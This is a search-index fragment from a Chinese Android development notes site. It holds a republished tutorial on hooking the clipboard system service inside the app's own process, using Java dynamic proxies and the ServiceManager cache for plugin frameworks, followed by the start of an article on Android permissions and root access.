\u8fd9\u4e2a\u65b9\u6cd5\u7684\u5168\u90e8\uff0c\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u8fd9\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u4e0d\u80fd\u662f\u53ea\u62e5\u6709\u672c\u5730Binder\u5bf9\u8c61(\u539f\u59cb queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61)\u7684\u80fd\u529b\uff0c\u8fd8\u8981\u6709Binder\u4ee3\u7406\u5bf9\u8c61\u64cd\u7eb5\u9a71\u52a8\u7684\u80fd\u529b\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u4ee5Hook\u7cfb\u7edf\u7684\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u7528\u5b9e\u9645\u4ee3\u7801\u6765\u8bf4\u660e\uff0c\u5982\u4f55Hook\u6389\u7cfb\u7edf\u670d\u52a1\u3002","title":"getService\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#hook_1","text":"","title":"Hook\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#_2","text":"\u9996\u5148\u6211\u4eec\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e00\u4e2a\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61\uff0c\u5173\u4e8e\u5982\u4f55\u4f7f\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u8fdb\u884chook\u4ee5\u53ca\u5176\u4e2d\u7684\u539f\u7406\uff0c\u53ef\u4ee5\u67e5\u770b \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0fHook\u6389\u4e86 hasPrimaryClip() \uff0c getPrimaryClip() \u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff1a public class BinderHookHandler implements InvocationHandler { private static final String TAG = \"BinderHookHandler\"; // \u539f\u59cb\u7684Service\u5bf9\u8c61 (IInterface) Object base; public BinderHookHandler(IBinder base, Class<?> stubClass) { try { Method asInterfaceMethod = stubClass.getDeclaredMethod(\"asInterface\", IBinder.class); // IClipboard.Stub.asInterface(base); this.base = asInterfaceMethod.invoke(null, base); } catch (Exception e) { throw new RuntimeException(\"hooked failed!\"); } } @TargetApi(Build.VERSION_CODES.HONEYCOMB) @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // \u628a\u526a\u5207\u7248\u7684\u5185\u5bb9\u66ff\u6362\u4e3a \"you are hooked\" if (\"getPrimaryClip\".equals(method.getName())) { Log.d(TAG, \"hook getPrimaryClip\"); return ClipData.newPlainText(null, \"you are hooked\"); } // \u6b3a\u9a97\u7cfb\u7edf,\u4f7f\u4e4b\u8ba4\u4e3a\u526a\u5207\u7248\u4e0a\u4e00\u76f4\u6709\u5185\u5bb9 if (\"hasPrimaryClip\".equals(method.getName())) { return true; } return method.invoke(base, args); }} \u6ce8\u610f\uff0c\u6211\u4eec\u62ff\u5230\u539f\u59cb\u7684 IBinder \u5bf9\u8c61\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u88abHook\u4e4b\u524d\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a IBinder \u5bf9\u8c61\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528 asInterface \u65b9\u6cd5\u5c06\u5b83\u8f6c\u6362\u4e3a IClipboard \u63a5\u53e3\uff1b\u56e0\u4e3a getService \u65b9\u6cd5\u8fd4\u56de\u7684 IBinder \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a \u88f8Binder\u4ee3\u7406\u5bf9\u8c61 \uff0c\u5b83\u53ea\u6709\u4e0e\u9a71\u52a8\u6253\u4ea4\u9053\u7684\u80fd\u529b\uff0c\u4f46\u662f\u5b83\u5e76\u4e0d\u80fd\u72ec\u7acb\u5de5\u4f5c\uff0c\u9700\u8981\u4eba\u6307\u6325\u5b83\uff1b asInterface \u65b9\u6cd5\u8fd4\u56de\u7684 IClipboard.Stub.Proxy \u7c7b\u7684\u5bf9\u8c61\u901a\u8fc7\u64cd\u7eb5\u8fd9\u4e2a\u88f8 BinderProxy \u5bf9\u8c61\u4ece\u800c\u5b9e\u73b0\u4e86\u5177\u4f53\u7684 IClipboard \u63a5\u53e3\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002","title":"\u4f2a\u9020\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#ibinder","text":"\u5728\u4e0a\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4f2a\u9020\u597d\u4e86\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff0c\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9 asInterface \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u5bf9\u8c61\u4e86\uff1b\u6211\u4eec\u4f2a\u9020\u4e00\u4e2a IBinder \u5bf9\u8c61\uff1a public class BinderProxyHookHandler implements InvocationHandler { private static final String TAG = \"BinderProxyHookHandler\"; // \u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b,\u8fd9\u662f\u4e00\u4e2aBinderProxy\u5bf9\u8c61 // \u53ea\u6709\u5f53Service\u548c\u6211\u4eec\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5019\u624d\u662fBinder\u672c\u5730\u5bf9\u8c61 // \u8fd9\u4e2a\u57fa\u672c\u4e0d\u53ef\u80fd IBinder base; Class<?> stub; Class<?> iinterface; public BinderProxyHookHandler(IBinder base) { this.base = base; try { this.stub = Class.forName(\"android.content.IClipboard$Stub\"); this.iinterface = Class.forName(\"android.content.IClipboard\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (\"queryLocalInterface\".equals(method.getName())) { Log.d(TAG, \"hook queryLocalInterface\"); // \u8fd9\u91cc\u76f4\u63a5\u8fd4\u56de\u771f\u6b63\u88abHook\u6389\u7684Service\u63a5\u53e3 // \u8fd9\u91cc\u7684 queryLocalInterface \u5c31\u4e0d\u662f\u539f\u672c\u7684\u610f\u601d\u4e86 // \u6211\u4eec\u80af\u5b9a\u4e0d\u4f1a\u771f\u7684\u8fd4\u56de\u4e00\u4e2a\u672c\u5730\u63a5\u53e3, \u56e0\u4e3a\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface\u65b9\u6cd5\u7684\u4f5c\u7528 // \u56e0\u6b64\u5fc5\u987b\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 asInterface \u8fc7\u7684 IInterface\u5bf9\u8c61, \u65e2\u8981\u5904\u7406\u672c\u5730\u5bf9\u8c61,\u4e5f\u8981\u5904\u7406\u4ee3\u7406\u5bf9\u8c61 // \u8fd9\u53ea\u662f\u4e00\u4e2aHook\u70b9\u800c\u5df2, \u5b83\u539f\u59cb\u7684\u542b\u4e49\u5df2\u7ecf\u88ab\u6211\u4eec\u91cd\u5b9a\u4e49\u4e86; \u56e0\u4e3a\u6211\u4eec\u4f1a\u6c38\u8fdc\u786e\u4fdd\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u8fd4\u56denull // \u8ba9 IClipboard.Stub.asInterface \u6c38\u8fdc\u8d70\u5230if\u8bed\u53e5\u7684else\u5206\u652f\u91cc\u9762 return Proxy.newProxyInstance(proxy.getClass().getClassLoader(), // asInterface \u7684\u65f6\u5019\u4f1a\u68c0\u6d4b\u662f\u5426\u662f\u7279\u5b9a\u7c7b\u578b\u7684\u63a5\u53e3\u7136\u540e\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362 // \u56e0\u6b64\u8fd9\u91cc\u7684\u52a8\u6001\u4ee3\u7406\u751f\u6210\u7684\u7c7b\u578b\u4fe1\u606f\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6b63\u786e\u7684 new Class[] { IBinder.class, IInterface.class, this.iinterface }, new BinderHookHandler(base, stub)); } Log.d(TAG, \"method:\" + method.getName()); return method.invoke(base, args); }} \u6211\u4eec\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e86\u4e00\u4e2a\u8ddf\u539f\u59cb IBinder \u4e00\u6a21\u4e00\u6837\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u8fd4\u56de\u4e86\u6211\u4eec\u7b2c\u4e00\u6b65\u521b\u5efa\u7684 \u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff1b\u6ce8\u610f\u770b\u6ce8\u91ca\uff0c\u8be6\u7ec6\u89e3\u91ca\u53ef\u4ee5\u770b \u4ee3\u7801","title":"\u4f2a\u9020IBinder \u5bf9\u8c61"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#servicemanageribinder","text":"\u73b0\u5728\u5c31\u662f\u4e07\u4e8b\u5177\u5907\uff0c\u53ea\u6b20\u4e1c\u98ce\u4e86\uff1b\u6211\u4eec\u4f7f\u7528\u53cd\u5c04\u7684\u65b9\u5f0f\u4fee\u6539 ServiceManager \u7c7b\u91cc\u9762\u7f13\u5b58\u7684Binder\u5bf9\u8c61\uff0c\u4f7f\u5f97 getService \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\uff0c\u8fdb\u800c asInterface \u65b9\u6cd5\u4f7f\u7528\u4f2a\u9020 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u4e86\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u4ee3\u7801\u8f83\u7b80\u5355\uff0c\u5982\u4e0b\uff1a final String CLIPBOARD_SERVICE = \"clipboard\";// \u4e0b\u9762\u8fd9\u4e00\u6bb5\u7684\u610f\u601d\u5b9e\u9645\u5c31\u662f: ServiceManager.getService(\"clipboard\");// \u53ea\u4e0d\u8fc7 ServiceManager\u8fd9\u4e2a\u7c7b\u662f@hide\u7684Class<?> serviceManager = Class.forName(\"android.os.ServiceManager\");Method getService = serviceManager.getDeclaredMethod(\"getService\", String.class);// ServiceManager\u91cc\u9762\u7ba1\u7406\u7684\u539f\u59cb\u7684Clipboard Binder\u5bf9\u8c61// \u4e00\u822c\u6765\u8bf4\u8fd9\u662f\u4e00\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61IBinder rawBinder = (IBinder) getService.invoke(null, CLIPBOARD_SERVICE);// Hook \u6389\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5// \u7136\u540e\u5728 queryLocalInterface \u8fd4\u56de\u4e00\u4e2aIInterface\u5bf9\u8c61, hook\u6389\u6211\u4eec\u611f\u5174\u8da3\u7684\u65b9\u6cd5\u5373\u53ef.IBinder hookedBinder = (IBinder) Proxy.newProxyInstance(serviceManager.getClassLoader(), new Class<?>[] { IBinder.class }, new BinderProxyHookHandler(rawBinder));// \u628a\u8fd9\u4e2ahook\u8fc7\u7684Binder\u4ee3\u7406\u5bf9\u8c61\u653e\u8fdbServiceManager\u7684cache\u91cc\u9762// \u4ee5\u540e\u67e5\u8be2\u7684\u65f6\u5019 \u4f1a\u4f18\u5148\u67e5\u8be2\u7f13\u5b58\u91cc\u9762\u7684Binder, \u8fd9\u6837\u5c31\u4f1a\u4f7f\u7528\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684Binder\u4e86Field cacheField = serviceManager.getDeclaredField(\"sCache\");cacheField.setAccessible(true);Map<String, IBinder> cache = (Map) cacheField.get(null);cache.put(CLIPBOARD_SERVICE, hookedBinder); \u63a5\u4e0b\u6765\uff0c\u5728app\u91cc\u9762\u4f7f\u7528\u526a\u5207\u7248\uff0c\u6bd4\u5982\u957f\u6309\u8fdb\u884c\u7c98\u8d34\u4e4b\u540e\uff0c\u526a\u5207\u7248\u7684\u5185\u5bb9\u6c38\u8fdc\u90fd\u662f you are hooked \u4e86\uff1b\u8fd9\u6837\uff0c\u6211\u4eecHook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u5ba3\u544a\u5b8c\u6210\uff01\u8be6\u7ec6\u7684\u4ee3\u7801\u53c2\u89c1 github \u3002 \u4e5f\u8bb8\u4f60\u4f1a\u95ee\uff0c\u63d2\u4ef6\u6846\u67b6\u4f1a\u8fd9\u4e48hook\u5417\uff1f\u5982\u679c\u4e0d\u662f\u90a3\u4e48\u63d2\u4ef6\u6846\u67b6hook\u8fd9\u4e9b\u5e72\u4ec0\u4e48\uff1f\u63d2\u4ef6\u6846\u67b6\u5f53\u7136\u4e0d\u4f1a\u505a\u66ff\u6362\u6587\u672c\u8fd9\u4e48\u65e0\u804a\u7684\u4e8b\u60c5\uff0cDroidPlugin\u63d2\u4ef6\u6846\u67b6\u7ba1\u7406\u63d2\u4ef6\u4f7f\u5f97\u63d2\u4ef6\u5c31\u50cf\u662f\u4e3b\u7a0b\u5e8f\u4e00\u6837\uff0c\u56e0\u6b64\u63d2\u4ef6\u9700\u8981\u4f7f\u7528\u4e3b\u7a0b\u5e8f\u7684\u526a\u5207\u7248\uff0c\u63d2\u4ef6\u4e4b\u95f4\u4e5f\u4f1a\u5171\u7528\u526a\u5207\u7248\uff1b\u5176\u4ed6\u7684\u4e00\u4e9b\u7cfb\u7edf\u670d\u52a1\u4e5f\u7c7b\u4f3c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u63d2\u4ef6\u548c\u5bbf\u4e3b\u7a0b\u5e8f\u4e4b\u95f4\u7684\u5929\u8863\u670d\u7f1d\uff0c\u6c34\u4e73\u4ea4\u878d\uff01\u53e6\u5916\uff0c ActivityManager \u4ee5\u53ca PackageManager \u8fd9\u4e24\u4e2a\u7cfb\u7edf\u670d\u52a1\u867d\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0fhook\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4eec\u7684\u91cd\u8981\u6027\u548c\u7279\u6b8a\u6027\uff0cDroidPlugin\u4f7f\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u4f1a\u5355\u72ec\u8bb2\u89e3\u3002 \u559c\u6b22\u5c31\u70b9\u4e2a\u8d5e\u5427\uff5e\u6301\u7eed\u66f4\u65b0\uff0c\u8bf7\u5173\u6ce8github\u9879\u76ee understand-plugin-framework \u548c\u6211\u7684 \u535a\u5ba2 ! \u539f\u6587\u94fe\u63a5\uff1a https://weishu.me/2016/02/16/understand-plugin-framework-binder-hook/","title":"\u66ff\u6362ServiceManager\u7684IBinder\u5bf9\u8c61"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/","text":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650 Android\u6743\u9650\u8bf4\u660e Android\u7cfb\u7edf\u662f\u8fd0\u884c\u5728Linux\u5185\u6838\u4e0a\u7684\uff0cAndroid\u4e0eLinux\u5206\u522b\u6709\u81ea\u5df1\u7684\u4e00\u5957\u4e25\u683c\u7684\u5b89\u5168\u53ca\u6743\u9650\u673a\u5236\uff0c Android\u7cfb\u7edf\u6743\u9650\u76f8\u5173\u7684\u5185\u5bb9\uff0c \uff08\u4e00\uff09linux\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6743\u9650 -rwxr-x--x system system 4156 2012-06-30 16:12 test.apk. \u4ee3\u8868\u7684\u662f\u76f8\u5e94\u7684\u7528\u6237/\u7528\u6237\u7ec4\u53ca\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0e\u6b64\u6587\u4ef6\u8fd0\u884c\u8d77\u6765\u5177\u6709\u7684\u6743\u9650\u5b8c\u5168\u4e0d\u76f8\u5173\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bf4\u660esystem\u7528\u6237\u62e5\u6709\u5bf9\u6b64\u6587\u4ef6\u7684\u8bfb\u5199\u6267\u884c\u6743\u9650\uff1bsystem\u7ec4\u7684\u7528\u6237\u5bf9\u6b64\u6587\u4ef6\u62e5\u6709\u8bfb\u3001\u6267\u884c\u6743\u9650\uff1b\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u53ea\u5177\u6709\u6267\u884c\u6743\u9650\u3002\u800ctest.apk\u8fd0\u884c\u8d77\u6765\u540e\u53ef\u4ee5\u5e72\u54ea\u4e9b\u4e8b\u60c5\uff0c\u8ddf\u8fd9\u4e2a\u5c31\u4e0d\u76f8\u5173\u4e86\u3002 \u5343\u4e07\u4e0d\u8981\u770bapk\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5c5e\u4e8esystem/system\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u6216\u8005root/root\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u5c31\u8ba4\u4e3aapk\u5177\u6709system\u6216root\u6743\u9650\u3002apk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\u7684,\u5bf9\u5e94\u7684\u662fAndroid\u72ec\u7279\u7684\u6743\u9650\u673a\u5236\uff0c\u53ea\u6709\u4f53\u73b0\u5230\u6587\u4ef6\u7cfb\u7edf\u4e0a\u65f6\u624d\u4f7f\u7528linux\u7684\u6743\u9650\u8bbe\u7f6e\u3002 \uff08\u4e8c\uff09Android\u7684\u6743\u9650\u89c4\u5219 \uff081)Android\u4e2d\u7684apk\u5fc5\u987b\u7b7e\u540d \u8fd9\u79cd\u7b7e\u540d\u4e0d\u662f\u57fa\u4e8e\u6743\u5a01\u8bc1\u4e66\u7684\uff0c\u4e0d\u4f1a\u51b3\u5b9a\u67d0\u4e2a\u5e94\u7528\u5141\u4e0d\u5141\u8bb8\u5b89\u88c5\uff0c\u800c\u662f\u4e00\u79cd\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u91cd\u8981\u7684\u662f\uff0candroid\u7cfb\u7edf\u6709\u7684\u6743\u9650\u662f\u57fa\u4e8e\u7b7e\u540d\u7684\u3002\u6bd4\u5982\uff1asystem\u7b49\u7ea7\u7684\u6743\u9650\u6709\u4e13\u95e8\u5bf9\u5e94\u7684\u7b7e\u540d\uff0c\u7b7e\u540d\u4e0d\u5bf9\uff0c\u6743\u9650\u4e5f\u5c31\u83b7\u53d6\u4e0d\u5230\u3002 \u9ed8\u8ba4\u751f\u6210\u7684APK\u6587\u4ef6\u662fdebug\u7b7e\u540d\u7684\u3002\u83b7\u53d6system\u6743\u9650\u65f6\u7528\u5230\u7684\u7b7e\u540d\u89c1\u540e\u9762\u63cf\u8ff0 \uff082\uff09\u57fa\u4e8eUserID\u7684\u8fdb\u7a0b\u7ea7\u522b\u7684\u5b89\u5168\u673a\u5236 \u8fdb\u7a0b\u6709\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u4e0e\u8fdb\u7a0b\u95f4\u9ed8\u8ba4\u662f\u4e0d\u80fd\u4e92\u76f8\u8bbf\u95ee\u7684\uff0cAndroid\u901a\u8fc7\u4e3a\u6bcf\u4e00\u4e2aapk\u5206\u914d\u552f\u4e00\u7684linux userID\u6765\u5b9e\u73b0\uff0c\u540d\u79f0\u4e3a\"app_\"\u52a0\u4e00\u4e2a\u6570\u5b57\uff0c\u6bd4\u5982app_43\u4e0d\u540c\u7684UserID\uff0c\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5apk\u4e4b\u95f4\u9ed8\u8ba4\u4fbf\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u3002 Android\u63d0\u4f9b\u4e86\u5982\u4e0b\u7684\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u4f7f\u4e24\u4e2aapk\u6253\u7834\u524d\u9762\u8bb2\u7684\u8fd9\u79cd\u58c1\u5792\u3002 \u5728AndroidManifest.xml\u4e2d\u5229\u7528sharedUserId\u5c5e\u6027\u7ed9\u4e0d\u540c\u7684package\u5206\u914d\u76f8\u540c\u7684userID\uff0c\u901a\u8fc7\u8fd9\u6837\u505a\uff0c\u4e24\u4e2apackage\u53ef\u4ee5\u88ab\u5f53\u505a\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c \u7cfb\u7edf\u4f1a\u5206\u914d\u7ed9\u4e24\u4e2a\u7a0b\u5e8f\u76f8\u540c\u7684UserID\u3002\u5f53\u7136\uff0c\u57fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4e24\u4e2aapk\u9700\u8981\u76f8\u540c\u7684\u7b7e\u540d\uff0c\u5426\u5219\u6ca1\u6709\u9a8c\u8bc1\u4e5f\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\u3002 \uff083\uff09\u9ed8\u8ba4apk\u751f\u6210\u7684\u6570\u636e\u5bf9\u5916\u662f\u4e0d\u53ef\u89c1\u7684 \u5b9e\u73b0\u65b9\u6cd5\u662f\uff1aAndroid\u4f1a\u4e3a\u7a0b\u5e8f\u5b58\u50a8\u7684\u6570\u636e\u5206\u914d\u8be5\u7a0b\u5e8f\u7684UserID\u3002 \u501f\u52a9\u4e8eLinux\u4e25\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff0c\u4fbf\u5b9e\u73b0\u4e86apk\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u4f3c\u6709\u6570\u636e\u7684\u673a\u5236\u3002 \u4f8b\uff1a\u6211\u7684\u5e94\u7528\u521b\u5efa\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u9ed8\u8ba4\u6743\u9650\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709UserID\u4e3aapp_21\u7684\u7a0b\u5e8f\u624d\u80fd\u8bfb\u5199\u8be5\u6587\u4ef6\u3002 -rw------- app_21 app_21 87650 2000-01-01 09:48 test.txt \u5982\u4f55\u5bf9\u5916\u5f00\u653e\uff1f <1> \u4f7f\u7528MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE\u6807\u8bb0\u3002 When creating a new file with getSharedPreferences(String, int), openFileOutput(String, int), or openOrCreateDatabase(String, int, SQLiteDatabase.CursorFactory), you can use the MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE flags to allow any other package to read/write the file. When setting these flags, the file is still owned by your application, but its global read and/or write permissions have been set appropriately so any other application can see it. \uff084\uff09AndroidManifest.xml\u4e2d\u7684\u663e\u5f0f\u6743\u9650\u58f0\u660e Android\u9ed8\u8ba4\u5e94\u7528\u662f\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u53bb\u64cd\u4f5c\u5176\u4ed6\u5e94\u7528\u6216\u7cfb\u7edf\u76f8\u5173\u7279\u6027\u7684\uff0c\u5e94\u7528\u5728\u8fdb\u884c\u67d0\u4e9b\u64cd\u4f5c\u65f6\u90fd\u9700\u8981\u663e\u5f0f\u5730\u53bb\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u4ee5\u4e0b\u52a8\u4f5c\u65f6\u90fd\u9700\u8981\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\uff1a A particular permission may be enforced at a number of places during your program's operation: At the time of a call into the system, to prevent an application from executing certain functions.When starting an activity, to prevent applications from launching activities of other applications.Both sending and receiving broadcasts, to control who can receive your broadcast or who can send a broadcast to you.When accessing and operating on a content provider.Binding or starting a service. \u5728\u5e94\u7528\u5b89\u88c5\u7684\u65f6\u5019\uff0cpackage installer\u4f1a\u68c0\u6d4b\u8be5\u5e94\u7528\u8bf7\u6c42\u7684\u6743\u9650\uff0c\u6839\u636e\u8be5\u5e94\u7528\u7684\u7b7e\u540d\u6216\u8005\u63d0\u793a\u7528\u6237\u6765\u5206\u914d\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u662f\u4e0d\u68c0\u6d4b\u6743\u9650\u7684\u3002\u5982\u679c\u5b89\u88c5\u65f6\u6743\u9650\u83b7\u53d6\u5931\u8d25\uff0c\u90a3\u6267\u884c\u5c31\u4f1a\u51fa\u9519\uff0c\u4e0d\u4f1a\u63d0\u793a\u7528\u6237\u6743\u9650\u4e0d\u591f\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6743\u9650\u4e0d\u8db3\u5bfc\u81f4\u7684\u5931\u8d25\u4f1a\u5f15\u53d1\u4e00\u4e2a SecurityException\uff0c\u4f1a\u5728\u7cfb\u7edflog\uff08system log\uff09\u4e2d\u6709\u76f8\u5173\u8bb0\u5f55\u3002 \uff085\uff09\u6743\u9650\u7ee7\u627f/UserID\u7ee7\u627f \u5f53\u6211\u4eec\u9047\u5230apk\u6743\u9650\u4e0d\u8db3\u65f6\uff0c\u6211\u4eec\u6709\u65f6\u4f1a\u8003\u8651\u5199\u4e00\u4e2alinux\u7a0b\u5e8f\uff0c\u7136\u540e\u7531apk\u8c03\u7528\u5b83\u53bb\u5b8c\u6210\u67d0\u4e2a\u5b83\u6ca1\u6709\u6743\u9650\u5b8c\u6210\u7684\u4e8b\u60c5\uff0c\u5f88\u9057\u61be\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u884c\u4e0d\u901a\u7684\u3002 \u524d\u9762\u8bb2\u8fc7\uff0candroid\u6743\u9650\u662f\u5728\u8fdb\u7a0b\u5c42\u9762\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2aapk\u5e94\u7528\u542f\u52a8\u7684\u5b50\u8fdb\u7a0b\u7684\u6743\u9650\u4e0d\u53ef\u80fd\u8d85\u8d8a\u5176\u7236\u8fdb\u7a0b\u7684\u6743\u9650\uff08\u5373apk\u7684\u6743\u9650\uff09\uff0c \u5373\u4f7f\u5355\u72ec\u8fd0\u884c\u67d0\u4e2a\u5e94\u7528\u6709\u6743\u9650\u505a\u67d0\u4e8b\uff0c\u4f46\u5982\u679c\u5b83\u662f\u7531\u4e00\u4e2aapk\u8c03\u7528\u7684\uff0c\u90a3\u6743\u9650\u5c31\u4f1a\u88ab\u9650\u5236\u3002 \u5b9e\u9645\u4e0a\uff0candroid\u662f\u901a\u8fc7\u7ed9\u5b50\u8fdb\u7a0b\u5206\u914d\u7236\u8fdb\u7a0b\u7684UserID\u5b9e\u73b0\u8fd9\u4e00\u673a\u5236\u7684\u3002 \uff08\u4e09\uff09\u5e38\u89c1\u6743\u9650\u4e0d\u8db3\u95ee\u9898\u5206\u6790 \u9996\u5148\u8981\u77e5\u9053\uff0c\u666e\u901aapk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u975eroot\u3001\u975esystem\u5c42\u7ea7\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u770b\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u7684\u6743\u9650\u65f6\uff0c\u770b\u7684\u662f\u6700\u540e\u4e09\u4f4d\u3002 \u53e6\u5916\uff0c\u901a\u8fc7system/app\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u4e00\u822c\u6bd4\u76f4\u63a5\u5b89\u88c5\u6216adb install\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u8981\u9ad8\u4e00\u4e9b\u3002 \u8a00\u5f52\u6b63\u4f20\uff0c\u8fd0\u884c\u4e00\u4e2aandroid\u5e94\u7528\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u9047\u5230\u6743\u9650\u4e0d\u8db3\uff0c\u4e00\u822c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5: \uff081\uff09Log\u4e2d\u53ef\u660e\u663e\u770b\u5230\u6743\u9650\u4e0d\u8db3\u7684\u63d0\u793a\u3002 